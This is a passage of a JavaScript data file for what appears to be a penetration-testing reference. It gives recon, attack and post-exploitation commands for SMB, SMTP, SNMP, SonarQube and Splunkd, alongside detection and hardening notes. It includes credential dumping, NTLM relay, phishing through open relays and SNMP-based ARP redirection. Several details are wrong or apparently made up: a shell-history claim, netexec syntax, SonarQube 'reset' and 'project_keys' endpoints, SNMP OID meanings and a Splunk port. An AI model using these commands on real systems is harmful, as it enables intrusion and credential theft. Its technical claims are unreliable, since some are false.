export const services = [
  {
    slug: "smb",
    name: "SMB",
    port: 445,
    protocol: "tcp",
    risk: "critical",
    tags: ["file-sharing", "windows", "lateral-movement"],
    summary:
      "Server Message Block is the file and print sharing protocol underneath every Windows file server, and it is also the pivot point for most lateral movement you will ever do. Modern SMB2/3 negotiates cleanly and can encrypt the session, but the default posture on a domain member is still no message signing required, guest access enabled on some shares, and a local administrator password reused across the estate. A single anonymous or weakly authenticated share on one host becomes a route to domain-wide compromise, because the same credentials tend to work on everything else.",
    connect: [
      {
        label: "Anonymous share listing",
        command: "smbclient -L //<target> -N",
        detail:
          "smbclient -N skips the password prompt and lists the server's shares as the anonymous or guest session. An empty list accompanied by an access-denied status means the port is protected, not closed.",
      },
      {
        label: "Authenticated session",
        command: "smbclient //<target>/<share> -U <user>%<password>",
        detail:
          "The percent form keeps the credential out of your shell history. On a shared machine use -U <user> and let the client prompt you for the password instead.",
      },
      {
        label: "Impersonate with impacket",
        command: "impacket-smbclient -target-ip <ip> -username <user> -password <password>",
        detail:
          "impacket-smbclient speaks the same protocol but offers NT hash authentication and cleaner scripting than smbclient, which makes it the better choice once you are working with hash-based credentials.",
      },
    ],
    recon: [
      {
        title: "Operating system, dialect and signing",
        command:
          "nmap -sV -p 445 --script smb-os-discovery,smb-protocols,smb2-security-mode <target>",
        detail:
          "smb-os-discovery returns the Windows build, smb-protocols shows whether the ancient SMB1 dialect is still accepted, and smb2-security-mode reports whether signing is required, enabled or disabled. That last value decides whether relay is worth attempting.",
      },
      {
        title: "Patch and misconfiguration sweep",
        command: "nmap -p 445 --script smb2-vuln,smb-vuln-ms17-010 <target>",
        detail:
          "These scripts report on the EternalBlue-class issues and a set of common misconfigurations. Treat a vulnerable line as a prompt to confirm the patch level by hand rather than as a finding in itself.",
      },
    ],
    enumeration: [
      {
        title: "Share list and permissions",
        command: "smbclient -L //<target> -U <user>%<password>",
        detail:
          "The listing gives share names, the disk size and the share comment. The anonymous entries here are the ones to test first, because they need no credential at all.",
      },
      {
        title: "Recursive directory enumeration",
        command: "enum4linux -S -u <user> -p <password> <target>",
        detail:
          "enum4linux walks the share tree and reports file permissions, which shows you where to stage a payload and which directories a low-privilege account can already write to.",
      },
      {
        title: "Session and domain information",
        command: "netexec --target <ip> -u <user> -p <password> --shares --sessions",
        detail:
          "netexec prints the server's domain and the shares visible to the supplied credentials, and it can try the same credential set across a subnet when you give it a range.",
      },
    ],
    attacks: [
      {
        title: "Anonymous or guest access to a share",
        severity: "critical",
        command: "smbclient //<target>/<share> -N -c 'dir'",
        detail:
          "A share that lets a guest session read or write needs no exploit at all. It is still a full compromise of whatever sits on the share, and a writable share lets you stage a payload or edit a startup script.",
        detection:
          "Anonymous session creation events and SMB tree connects from hosts that do not host the workload.",
        fix:
          "Disable guest and null sessions, remove the Everyone entry from share and NTFS permissions, and require explicit domain credentials.",
      },
      {
        title: "Password spraying across the estate",
        severity: "high",
        command: "netexec --target <ip> -u <user> -p <password> --shares",
        detail:
          "A single local administrator password reused on many hosts means one cracked hash authenticates everywhere. Local authentication against netexec also exposes the machine's credential database, which becomes the next password to try.",
        detection:
          "A spike of failed logons from one source against many hosts, followed by successes on hosts that share the same local administrator password.",
        fix:
          "Use a unique local administrator password on every host, enable LAPS so the passwords are rotated automatically, and move to tiered administration with privileged access workstations.",
      },
      {
        title: "NTLM relay against unsigned SMB",
        severity: "high",
        command: "responder -I <ip> -v",
        detail:
          "When SMB signing is not required, a captured authentication can be relayed to another service that also accepts NTLM. Signing is mandatory on current Windows but optional on some appliances and Samba, and optional is the answer that matters.",
        detection:
          "Logon events with an unusual logon type, or NTLM authentications arriving at a service that should never receive them.",
        fix:
          "Require SMB signing on every host and server, and block outbound SMB and NTLM to anything other than the domain controllers.",
      },
    ],
    postEx: [
      {
        title: "Execute a command over SMBExec",
        severity: "critical",
        command: "impacket-psexec <user>:<password>@<target>",
        detail:
          "psexec starts a service through the SMB service manager and runs a payload as SYSTEM. It opens the remote registry on the way, which leaves a distinct trail in the logs.",
        detection:
          "Service creation event 7045 in the System log, and remote registry access from the attacking host.",
        fix:
          "Restrict SMB administration to jump hosts, and alert on 7045 events naming a service nobody expected.",
      },
      {
        title: "Stage a payload in a writable share",
        severity: "high",
        command: "smbclient //<target>/<share> -U <user>%<password> -c 'put payload.exe'",
        detail:
          "Any writable share combined with a service that executes from that path is remote execution without touching the service manager. Old scheduled task XML dropped on a writable share is the classic variant.",
        detection:
          "New or modified binaries appearing in share paths, and task registration events from non-administrator workstations.",
        fix:
          "Make share paths read-only for ordinary users, and keep executable content out of them entirely.",
      },
      {
        title: "Read the credential store off the host",
        severity: "high",
        command: "impacket-secretsdump <target>",
        detail:
          "When local administrator credentials work, secretsdump pulls the SAM and SYSTEM hives. The result is an offline cracking target and, in some cases, cached domain credentials that unlock other hosts.",
        detection:
          "Remote registry service access to the hive keys, and copies of hives written to disk.",
        fix:
          "Restrict the remote registry service, protect administrator accounts with unique passwords, and enable LAPS.",
      },
    ],
    commands: [
      { command: "smbclient -L //<target> -N", description: "List shares as the anonymous session." },
      { command: "smbclient //<target>/<share> -U <user>", description: "Open a share and drop into the interactive prompt." },
      { command: "net use \\\\<target>\\<share> /user:<domain>\\<user> <password>", description: "Map the share from Windows." },
      { command: "netexec --target <ip> -u <user> -p <password>", description: "Test one credential set against a host." },
      { command: "netexec --target <ip> -u <user> -p <password> --local-auth", description: "Authenticate against the local SAM instead of the domain." },
      { command: "impacket-psexec <user>:<password>@<target>", description: "Remote command execution over SMB." },
      { command: "impacket-secretsdump <target>", description: "Dump SAM, SYSTEM and LSA secrets." },
      { command: "impacket-rpcdump <target>", description: "Enumerate the RPC interfaces the host exposes." },
      { command: "smbmap -H <target> -u <user> -p <password>", description: "Map the share tree and print the access matrix." },
    ],
    hardening: [
      {
        title: "Require SMB signing",
        detail:
          "Set the server and client policy that digitally signs SMB communications. On a domain this belongs in a Group Policy object; on appliances it is a setting most people never open.",
      },
      {
        title: "Retire SMB1",
        detail:
          "Disable the SMB1 dialect on every host and appliance. It is deprecated, it is unauthenticated, and it is the basis of a large share of the worms that still circulate.",
      },
      {
        title: "Block 445 at the perimeter",
        detail:
          "Drop SMB entirely on the internet-facing firewall. Inside the estate, restrict 445 to the systems that genuinely need it and log the exceptions.",
      },
      {
        title: "Remove guest and anonymous access",
        detail:
          "Deny anonymous access to the IPC$ and ADMIN$ shares, turn off null sessions, and take the Everyone group out of share and NTFS permissions.",
      },
      {
        title: "Encrypt sensitive shares",
        detail:
          "SMB3 encryption protects the payload of a session even if the network path is hostile. Enable it on servers holding data you would not want on the wire.",
      },
      {
        title: "Patch and retire old appliances",
        detail:
          "Keep Windows and Samba current. Unsupported network gear is the most common way an SMB port ends up exposed to something that should not be on the network at all.",
      },
    ],
    tools: ["nmap", "smbclient", "netexec", "impacket", "responder", "metasploit"],
  },
  {
    slug: "smtp",
    name: "SMTP",
    port: 25,
    protocol: "tcp",
    risk: "high",
    tags: ["mail", "open-relay", "phishing"],
    summary:
      "SMTP is the protocol that moves mail between servers and, on port 25, it is also the protocol that accepts mail from strangers. A relay that will forward anything for anyone sends your phishing to thousands of inboxes and gets your sending domain and your server's address blacklisted within days. Even a properly locked-down server leaks: VRFY and EXPN disclose which mailboxes exist, and an unencrypted submission path hands over base64-encoded credentials to anyone on the wire.",
    connect: [
      {
        label: "Interactive session",
        command: "nc -nv <target> 25",
        detail:
          "A 220 greeting naming the host and announcing ESMTP confirms the service. VRFY, EXPN and AUTH are usually still present even where relaying is disabled, so a friendly banner is not evidence of a hardened server.",
      },
      {
        label: "Send a test message",
        command: "swaks --to <user>@<domain> --from <user>@<domain> --server <target> --quit-after EHLO",
        detail:
          "swaks builds a correct SMTP dialogue for you. Stopping after the capability exchange is the safe way to see what the server supports without generating mail.",
      },
      {
        label: "STARTTLS negotiation",
        command: "openssl s_client -starttls smtp -connect <target>:25 -brief",
        detail:
          "If the server advertises STARTTLS this prints the certificate and the negotiated protocol versions. A self-signed certificate that names nothing useful is common and tells you nothing about the domain.",
      },
    ],
    recon: [
      {
        title: "Capability and version scan",
        command: "nmap -sV -p 25 --script smtp-commands,smtp-headers,smtp-starttls <target>",
        detail:
          "smtp-commands enumerates the verbs the server accepts, and smtp-headers submits a message so you can read the headers it injects, which usually includes the software version and the queue identifier format.",
      },
      {
        title: "Open relay check",
        command: "nmap -p 25 --script smtp-open-relay <target>",
        detail:
          "The script performs the full MAIL FROM and RCPT TO exchange to a third-party domain without authenticating. An accepted RCPT TO for an external domain is an open relay and a blocklist entry waiting to happen.",
      },
    ],
    enumeration: [
      {
        title: "Address verification",
        command: "nmap -p 25 --script smtp-user-enumeration --script-args smtp.user=<user> <target>",
        detail:
          "The script probes with VRFY, EXPN and RCPT TO to decide whether a mailbox exists. The response codes differ enough to separate real addresses from invented ones.",
      },
      {
        title: "Manual verification loop",
        command:
          "for u in <user1> <user2>; do printf 'VRFY %s\\r\\n' \"$u\" | nc -nv <target> 25 | head -2; done",
        detail:
          "VRFY answers 252 for a mailbox it likes and 550 for one it does not, and the wording often differs as well. Comparing the replies for one known-good and one known-bad address is enough to build a valid target list.",
      },
      {
        title: "Authentication method discovery",
        command: "printf 'EHLO <client.domain>\\r\\nQUIT\\r\\n' | nc -nv <target> 25",
        detail:
          "The EHLO response lists the extensions. If AUTH is present, the server will authenticate over plain submission, and the letters after it tell you whether LOGIN, PLAIN or CRAM-MD5 are accepted. LOGIN and PLAIN are base64, which is encoding and not encryption.",
      },
    ],
    attacks: [
      {
        title: "Open relay abused for phishing",
        severity: "high",
        command:
          "swaks --to <victim>@<domain> --from <user>@<domain> --server <target> --header 'Subject: Password reset required' --body 'Click the link below to confirm your account.'",
        detail:
          "If the server relays for strangers, your domain takes the damage. The mail leaves with your envelope sender and your server's address, so the receiving side sees a real host sending it and the anti-abuse systems score it accordingly.",
        detection:
          "A sudden rise in outbound message volume and in recipients outside your own domains, followed by matching complaint and blocklist hits.",
        fix:
          "Restrict relaying to authenticated users or known networks, publish SPF and DKIM and enforce DMARC, and monitor outbound queue volume per hour.",
      },
      {
        title: "Address enumeration for spear phishing",
        severity: "medium",
        command: "nmap -p 25 --script smtp-user-enumeration --script-args smtp.user=<user> <target>",
        detail:
          "VRFY and EXPN separate valid mailboxes from invalid ones. Combine the results with the names on an org chart and you have a list of addresses that will genuinely receive mail.",
        detection:
          "High volumes of VRFY or EXPN commands from one source, and repeated RCPT TO attempts across many different local parts.",
        fix:
          "Disable VRFY and EXPN, return an identical response for every address, and rate limit command volume per source.",
      },
      {
        title: "Credential capture from unencrypted submission",
        severity: "high",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 25 and host <ip>'",
        detail:
          "AUTH LOGIN and AUTH PLAIN send the username and password as base64 in the clear. On any untrusted path the credential is readable, and the same base64 pair works against the webmail front end of the same account.",
        detection:
          "Authentication attempts to the submission service arriving over unencrypted connections, and the same credential appearing against several services in a short window.",
        fix:
          "Require STARTTLS before AUTH, refuse AUTH on a plaintext channel, and move clients to port 587 with implicit TLS.",
      },
    ],
    postEx: [
      {
        title: "Read a mailbox over IMAP",
        severity: "medium",
        command: "curl -s -u <user>:<password> --url 'imap://<target>/'",
        detail:
          "Mail servers usually authenticate against the same directory the operator used for everything else, so credentials recovered from the box tend to open mailboxes as well.",
        detection:
          "Mailbox access from an address that has never been seen for that account, and authentication against the mail store from a host outside the user's device.",
        fix:
          "Separate the mail credential store from the system credential store, and require a second factor on webmail.",
      },
      {
        title: "Fetch individual message bodies",
        severity: "high",
        command: "curl -s -u <user>:<password> --url 'imap://<target>/INBOX;UID=1'",
        detail:
          "Each message body can be pulled on its own. Password resets, invoices and internal contracts are the useful finds, because they make a follow-on phishing attack credible to the people who receive it.",
        detection:
          "Bulk reads of a mailbox from a new source address, or access patterns with no corresponding user activity.",
        fix:
          "Alert on unusual mailbox access volume, and keep mail retention and access policies short and reviewed.",
      },
      {
        title: "Send mail from the trusted host",
        severity: "high",
        command:
          "swaks --from <user>@<domain> --to <target-user>@<domain> --server <target> --body 'A message from a legitimate internal server.'",
        detail:
          "From a compromised internal mail server, phishing lands in colleagues' inboxes with a real From address and a reply-to domain you control, so the abuse report goes to your own IT team before anyone sees it.",
        detection:
          "Outbound mail from a server that normally sends only internal notifications, and a rise in spam complaints from internal recipients.",
        fix:
          "Restrict which hosts may send directly to external recipients, and require authentication on all submission paths.",
      },
    ],
    commands: [
      { command: "EHLO <client.domain>", description: "Capabilities and extensions the server offers." },
      { command: "HELO <client.domain>", description: "The legacy greeting with no extensions." },
      { command: "STARTTLS", description: "Upgrade the connection to TLS." },
      { command: "AUTH LOGIN", description: "Base64 credential exchange, no encryption." },
      { command: "MAIL FROM:<sender>", description: "Start a mail transaction with an envelope sender." },
      { command: "RCPT TO:<recipient>", description: "Add a recipient to the transaction." },
      { command: "DATA", description: "Terminate the headers and begin the message body." },
      { command: "VRFY <user>", description: "Ask whether an address exists." },
      { command: "EXPN <list>", description: "Expand a mailing list into its members." },
      { command: "RSET", description: "Abandon the current transaction." },
    ],
    hardening: [
      {
        title: "Stop relaying for strangers",
        detail:
          "Configure relay_recipient_maps so that only authenticated users and explicitly listed networks can submit mail for outside recipients.",
      },
      {
        title: "Disable VRFY and EXPN",
        detail:
          "Turn both commands off in the main configuration. If they must stay for a legacy client, return the same answer for every address so they reveal nothing.",
      },
      {
        title: "Require encryption before authentication",
        detail:
          "Refuse AUTH on a plaintext channel and make STARTTLS mandatory. Clear the session queue when a client attempts to authenticate without upgrading.",
      },
      {
        title: "Publish SPF, DKIM and DMARC",
        detail:
          "Set SPF and DKIM on everything you send and enforce DMARC with a reject policy. Without them, anyone can send mail that looks like it came from you.",
      },
      {
        title: "Rate limit and log command abuse",
        detail:
          "Throttle VRFY, EXPN and RCPT volume per source and log rejected commands. Mail servers are abused for enumeration and for spam, and both show up as command volume.",
      },
      {
        title: "Separate submission from transfer",
        detail:
          "Keep port 25 for server-to-server transfer and point clients at 587 with implicit TLS. Clients on 25 are the source of most relay attempts.",
      },
    ],
    tools: ["nmap", "netcat", "hydra", "metasploit", "tcpdump"],
  },
  {
    slug: "snmp",
    name: "SNMP",
    port: 161,
    protocol: "udp",
    risk: "high",
    tags: ["monitoring", "default-credentials", "udp"],
    summary:
      "SNMP is how the network is told what it is, and versions 1 and 2c authenticate with a community string that is really a password wearing a different name. The defaults such as public and private are still common enough that an unauthenticated walk of a device yields its model, its interface list and, on some platforms, its configuration. SNMPv3 fixes the problem properly with authentication and encryption, but it is also the version people skip because the migration is tedious.",
    connect: [
      {
        label: "Walk with the net-snmp tools",
        command: "snmpwalk -v2c -c public <ip>",
        detail:
          "snmpwalk requests every OID under the system tree. A response at all means the community string was accepted, so the string itself is the credential.",
      },
      {
        label: "Single OID query",
        command: "snmpget -v2c -c public <ip> .1.3.6.1.2.1.1.1.0",
        detail:
          "sysDescr.0 holds the device description and is a good first probe: it usually names the vendor, the model and the firmware version in a single string.",
      },
      {
        label: "Version 3 session",
        command:
          "snmpwalk -v3 -u <user> -l authPriv -a SHA -A <auth_pass> -x AES -X <priv_pass> <ip>",
        detail:
          "Version 3 needs a user, an authentication passphrase and a privacy passphrase, each with its own protocol. Keep the passphrases in a persistent file rather than on the command line on a shared host.",
      },
    ],
    recon: [
      {
        title: "UDP service confirmation",
        command: "nmap -sU -p 161 --reason <ip>",
        detail:
          "SNMP is UDP, so the usual result is open|filtered. A closed port answers with an ICMP port-unreachable and nmap reports that as closed, and the difference between the two is the whole recon problem.",
      },
      {
        title: "Community string sweep",
        command: "onesixtyone -l /usr/share/nmap/nselib/data/snmp-community.txt -h <ip>",
        detail:
          "onesixtyone tries each community string from a list against the host and reports which one works. It is fast and quiet, and it is the first thing to run on any device you have been given keys for.",
      },
      {
        title: "Version and detail probe",
        command: "nmap -sU -p 161 --script snmp-info,snmp-sysdescr <ip>",
        detail:
          "snmp-info reports the community strings the device accepts, whether version 3 is supported and the transport it used. snmp-sysdescr returns the device description string.",
      },
    ],
    enumeration: [
      {
        title: "Full OID inventory",
        command: "snmpwalk -v2c -c public <ip> .1.3.6.1.2.1",
        detail:
          "This is the MIB-2 tree: system, interfaces, IP routing, ARP and SNMP statistics. Interface names and the address translation tables map the network quickly.",
      },
      {
        title: "Device configuration",
        command: "snmpwalk -v2c -c <community> <ip> .1.3.6.1.4.1.9.2.1",
        detail:
          "Cisco exposes its running configuration through the ciscoConfig OID, and the configuration contains the AAA shared secret, the SNMP strings and sometimes enable passwords in clear. Equivalent OIDs exist on other vendors under their own enterprise trees.",
      },
      {
        title: "Host and software inventory",
        command: "snmpwalk -v2c -c public <ip> .1.3.6.1.2.1.25.4.2.1",
        detail:
          "The host and hrSWRun tables list installed software and the processes running on the device, which turns a switch into a way of listing every tool installed on the machines behind it.",
      },
    ],
    attacks: [
      {
        title: "Default or weak community string",
        severity: "high",
        command: "snmpwalk -v2c -c public <ip> .1.3.6.1.2.1.1.1.0",
        detail:
          "Community strings travel in clear on the wire, so anything on the path can read them. A default public is not a configuration detail, it is a missing authentication control.",
        detection:
          "SNMP requests arriving from a management host that is not the network management system, and a change in the source address for a given community string.",
        fix:
          "Move to SNMPv3 with authPriv, change every remaining version 1 and 2c string, and filter UDP 161 down to the monitoring hosts.",
      },
      {
        title: "SNMP write access reconfiguration",
        severity: "critical",
        command: "snmpset -v2c -c private <ip> .1.3.6.1.4.1.9.9.99.1.1.1.1.1 i 1",
        detail:
          "A read-write community string on a Cisco device allows snmpset to change running configuration values. Depending on the platform that means adding a route, a user, a name server entry or a new management access rule.",
        detection:
          "Any SNMP SET operation on a device where the management system only ever performs GETs.",
        fix:
          "Use version 3 with separate authentication and privacy levels, keep the community view read-only by default, and never share one string between read and write access.",
      },
      {
        title: "Information disclosure that maps the estate",
        severity: "medium",
        command: "snmpwalk -v2c -c public <ip> .1.3.6.1.2.1.4.20.1.1",
        detail:
          "The address translation tables and interface descriptions on one device reveal the addressing of everything behind it. That is not a compromise by itself, but it turns a blind scan into a targeted one.",
        detection:
          "Unusual volume of SNMP GETs covering many OID subtrees from a single source address.",
        fix:
          "Restrict SNMP to the monitoring tier, apply view-based access control on the device, and prefer version 3 so the responses are encrypted.",
      },
    ],
    postEx: [
      {
        title: "Recover credentials from a device configuration",
        severity: "critical",
        command: "snmpwalk -v2c -c <community> <ip> .1.3.6.1.4.1.9.2.1",
        detail:
          "The running configuration of a network device is where the AAA secrets, the RADIUS keys and the management passwords live. Reading it with a read-only string gives you the keys to everything else in the network.",
        detection:
          "SNMP GET requests against the configuration OID subtree from a source that is not the configuration management system.",
        fix:
          "Remove the configuration OID from the view for the monitoring community string and rotate any secret that has ever been readable.",
      },
      {
        title: "List the hosts behind a router",
        severity: "medium",
        command: "snmpwalk -v2c -c public <ip> .1.3.6.1.2.1.4.20.1.1",
        detail:
          "The ARP and address translation tables enumerate the hosts a router or firewall is currently forwarding for, with their MAC addresses and the interface they sit behind.",
        detection:
          "Sustained SNMP polling of the address translation table from a host outside the management VLAN.",
        fix:
          "Restrict SNMP views per community string so that operational tables are not readable from the monitoring host's string.",
      },
      {
        title: "Redirect traffic with a write",
        severity: "critical",
        command: "snmpset -v2c -c private <ip> .1.3.6.1.2.1.4.20.1.1.1.<index> s <ip>",
        detail:
          "On a writable device you can add an ARP entry so that a host's traffic is delivered to your MAC address instead. It is a plain man-in-the-middle with no DNS involved at all.",
        detection:
          "SNMP SET operations, and an ARP table entry that points at a MAC address no other device on the segment reports.",
        fix:
          "Never use a read-write community string on production devices, and alert on every SET request the management system does not send.",
      },
    ],
    commands: [
      { command: "snmpget -v2c -c public <ip> <oid>", description: "Read a single value." },
      { command: "snmpwalk -v2c -c public <ip> <oid>", description: "Read every value under a subtree." },
      { command: "snmpbulkget -v2c -c public <ip> <oid>", description: "Bulk retrieval of several leaves at once." },
      { command: "snmpset -v2c -c private <ip> <oid> s <value>", description: "Write a value to the device." },
      { command: "snmpgetnext -v2c -c public <ip> <oid>", description: "Return the next OID in the tree." },
      { command: "snmpbulkwalk -v2c -c public <ip> <oid>", description: "Walk a subtree using bulk requests." },
      { command: "snmpget -O <oid> -v2c -c public <ip>", description: "Print the numeric OIDs for a symbolic name." },
      { command: "snmpwalk -v2c -c public <ip> 1.3.6.1.2.1.1", description: "Walk the system subtree only." },
      { command: "snmpget -v3 -u <user> -l authPriv -a SHA -A <auth_pass> -x AES -X <priv_pass> <ip> <oid>", description: "Authenticated and encrypted version 3 read." },
    ],
    hardening: [
      {
        title: "Deploy SNMPv3 with authPriv",
        detail:
          "Version 3 authenticates the manager, encrypts the payload and gives you per-user access control. It is the only configuration that survives an on-path attacker.",
      },
      {
        title: "Change the community strings",
        detail:
          "Any string still in use should be long, random and different on every device. A shared string means one captured packet opens the whole estate.",
      },
      {
        title: "Restrict access with an ACL",
        detail:
          "Apply a management ACL on the device so that only the network management system's addresses are permitted to reach the SNMP interface, and drop everything else.",
      },
      {
        title: "Use view-based access control",
        detail:
          "Create views so that the monitoring string can read operational tables but not the configuration OIDs, and never place a read-write string on a production device.",
      },
      {
        title: "Monitor the management plane",
        detail:
          "Alert on SNMP SET requests, on string changes and on the first request from a new source address. Each of those is either a mistake or an intrusion.",
      },
      {
        title: "Keep the device firmware current",
        detail:
          "Firmware updates fix default credentials, add version 3 support and close buffer issues in the agent. Older agents are also the ones that answer on more than the standard port.",
      },
    ],
    tools: ["nmap", "hashcat", "metasploit", "netcat"],
  },
  {
    slug: "sonarqube",
    name: "SonarQube",
    port: 9000,
    protocol: "tcp",
    risk: "high",
    tags: ["devops", "code-quality", "secrets"],
    summary:
      "SonarQube sits in the build pipeline and indexes the source of every project that passes through it, which makes it an unusually rich target for anyone who can reach it. Its REST API is documented, its default administrator password is well known, and the project data it stores includes hard-coded credentials, internal hostnames and API keys that were never meant to leave the repository. The scanner token is a further problem, because it unlocks the source of everything the pipeline builds.",
    connect: [
      {
        label: "Health and status",
        command: "curl -s http://<target>:9000/api/system/status",
        detail:
          "The status endpoint returns JSON with the version and the overall status. It needs no token by design and is a reliable service check.",
      },
      {
        label: "Version",
        command: "curl -s http://<target>:9000/api/server/version",
        detail:
          "A short response giving the exact release. Knowing the version tells you which API endpoints exist and which authentication modes the instance accepts.",
      },
      {
        label: "Authenticated request",
        command: "curl -s -u <user>:<password> http://<target>:9000/api/issues/search",
        detail:
          "The API accepts HTTP Basic credentials against the local account store or the configured identity provider, which makes a credential test a single request.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 9000 --script http-title,http-server-header <target>",
        detail:
          "The page title confirms SonarQube and the server header often names the reverse proxy in front of it, which is useful when the instance is not exposed directly.",
      },
      {
        title: "Web content discovery",
        command: "nmap -p 9000 --script http-enum <target>",
        detail:
          "http-enum probes common application paths and reports which ones answer. It gives a quick picture of whether the instance is a fresh install or a busy shared server.",
      },
    ],
    enumeration: [
      {
        title: "Project list",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/components/search?ps=100'",
        detail:
          "Every project and module the instance knows about is listed here with its visibility flag. Public projects are readable without a token and often hold the interesting material.",
      },
      {
        title: "Issues and rule hits",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/issues/search?components=<project_key>'",
        detail:
          "The issue API returns rule breaches with file paths and line numbers. Even where the source itself is not readable, the file names and anything the secret-detection rules matched are disclosed.",
      },
      {
        title: "User administration",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/users/search?ps=100'",
        detail:
          "This returns the user list with login names, email addresses and permissions. A flat list of developers is a ready-made target list for a credential attack.",
      },
    ],
    attacks: [
      {
        title: "Default administrator credentials",
        severity: "critical",
        command: "curl -s -u admin:admin http://<target>:9000/api/system/status",
        detail:
          "The setup wizard starts with a documented administrator password, and instances are frequently left on it because nobody revisits the setup. An administrator can read every project and change the build configuration.",
        detection:
          "Successful logins for admin from an address that is not the build runner, and configuration changes made through the web API outside a maintenance window.",
        fix:
          "Change the administrator password during the first run, use a service account where an administrator is not required, and put the instance behind single sign-on.",
      },
      {
        title: "Unauthenticated read of a public project",
        severity: "high",
        command: "curl -s 'http://<target>:9000/api/components/search?visibility=public'",
        detail:
          "Public visibility means the source tree and the detected issues are readable with no token at all. Teams set a project public to share it with a vendor and frequently never change it back.",
        detection:
          "API requests without a token returning project data, and a spike of component searches from a single source.",
        fix:
          "Default new projects to private, review the list of public projects on a schedule, and disable anonymous browsing in the global settings.",
      },
      {
        title: "Secrets held in the analysis results",
        severity: "high",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/issues/search?rules=secrets'",
        detail:
          "SonarQube stores the matched secret together with the surrounding source line, which turns the quality gate into a credential vault holding API keys, database passwords and tokens that were committed years ago and never rotated.",
        detection:
          "Bulk queries against the issues API filtered on secret rules, or requests for very large page sizes.",
        fix:
          "Rotate any secret that has ever been committed, exclude secret files from indexing where the platform allows it, and treat the instance as sensitive data.",
      },
    ],
    postEx: [
      {
        title: "Download source from a project",
        severity: "high",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/sources/raw?key=<project_key>'",
        detail:
          "The sources API returns the raw file content of a project. This is a full source disclosure delivered through the scanner rather than through the repository.",
        detection:
          "Calls to the sources API with no corresponding developer session on the instance.",
        fix:
          "Restrict the sources API to the roles that genuinely need it, and review which roles can download source in bulk.",
      },
      {
        title: "Reset the administrator password",
        severity: "critical",
        command: "curl -s -X POST -u <user>:<password> http://<target>:9000/api/authentication/reset",
        detail:
          "The endpoint resets the default admin account back to the documented default password. With administrator rights it is a reliable way back in after a legitimate password change, and it also resets any second factor on that account.",
        detection:
          "A reset request that is not preceded by a documented maintenance action, and an administrative login immediately afterwards.",
        fix:
          "Require a strong authentication provider, disable the built-in admin account where possible, and alert on the reset endpoint.",
      },
      {
        title: "Read project keys and tokens",
        severity: "medium",
        command: "curl -s -u <user>:<password> 'http://<target>:9000/api/project_keys/search'",
        detail:
          "Project and organisation keys come back with their tokens. The keys are what a scanner uses to push results, and they are frequently reused across development, staging and production.",
        detection:
          "Reads of the project key collection from accounts that are not build runners.",
        fix:
          "Issue a separate key per pipeline, rotate them when a build agent is decommissioned, and keep them out of shared configuration repositories.",
      },
    ],
    commands: [
      { command: "curl -s http://<target>:9000/api/system/status", description: "Health and version of the instance." },
      { command: "curl -s http://<target>:9000/api/server/version", description: "Exact release string." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/authentication/validate", description: "Test one credential pair." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/components/search", description: "List projects and modules." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/issues/search", description: "Search issues and rule hits." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/users/search", description: "List users and permissions." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/sources/raw?key=<key>", description: "Download raw source from a project." },
      { command: "curl -s -X POST -u <user>:<password> http://<target>:9000/api/authentication/reset", description: "Reset the default admin password." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/users/current", description: "Show the caller's effective permissions." },
      { command: "curl -s -u <user>:<password> http://<target>:9000/api/project_keys/search", description: "List project keys and their tokens." },
    ],
    hardening: [
      {
        title: "Change the default password at first start",
        detail:
          "The setup wizard is the only place this happens, so put it in the deployment checklist. An instance that has never had its password changed is the common case.",
      },
      {
        title: "Use single sign-on and disable local accounts",
        detail:
          "Point the instance at the directory provider, require MFA there and remove the built-in accounts. Local accounts on a code quality server are usually forgotten passwords waiting to be used.",
      },
      {
        title: "Default new projects to private",
        detail:
          "Public visibility should be an explicit, reviewed decision for each project rather than the inherited default for all of them.",
      },
      {
        title: "Restrict network access to the build runners",
        detail:
          "Only the continuous integration agents and the developers who need the web interface should reach port 9000. Put it on an internal interface and enforce it at the firewall.",
      },
      {
        title: "Rotate any secret that has been scanned",
        detail:
          "Treat every credential the instance has ever indexed as compromised, because it is stored with its source line in the issue database.",
      },
      {
        title: "Patch and remove unused plugins",
        detail:
          "SonarQube plugins carry their own permissions and their own vulnerability history. Install the ones you use, keep them current and remove the rest.",
      },
    ],
    tools: ["nmap", "httpx", "nikto", "searchsploit", "nuclei"],
  },
  {
    slug: "splunkd",
    name: "Splunkd",
    port: 8089,
    protocol: "tcp",
    risk: "high",
    tags: ["siem", "logging", "management"],
    summary:
      "Splunkd is the log collector and indexer at the heart of Splunk, and its management port carries the REST API that administers the deployment. That API also holds the things people forget: passwords embedded in saved searches, tokens in the application configuration and the service account's own secret. Because the platform exists to hold everything else that leaked, compromising it tells you exactly what the defenders can see.",
    connect: [
      {
        label: "Server information",
        command: "curl -sk https://<target>:8089/services/server/info",
        detail:
          "The management interface normally presents a self-signed certificate, so -k is needed unless you have the internal CA. The endpoint returns the version, the licence state and the user count.",
      },
      {
        label: "Authentication test",
        command: "curl -sk -u <user>:<password> https://<target>:8089/services/authentication/users",
        detail:
          "Splunk's REST API uses HTTP Basic with the Splunk account credentials. A 401 versus a 200 tells you straight away whether the pair is valid.",
      },
      {
        label: "Deployment status",
        command: "curl -sk https://<target>:8089/services/server/status",
        detail:
          "The status endpoint reports the state of the deployment and which roles are present, which is the fastest way to understand the tiering you are looking at.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 8089 --script http-title,ssl-cert <target>",
        detail:
          "The certificate subject and the page title usually identify the Splunk deployment and the organisation that owns it, and the certificate often carries the internal domain name.",
      },
      {
        title: "Managed endpoint sweep",
        command: "nmap -sV -p 8089,8000,9997,8088 <target>",
        detail:
          "Splunk spreads over several ports: the manager on 8089, the web interface on 8000, the deployment server on 8088 and forwarders receiving data on 9997. Finding the whole set tells you how the deployment is layered.",
      },
    ],
    enumeration: [
      {
        title: "Saved search list",
        command:
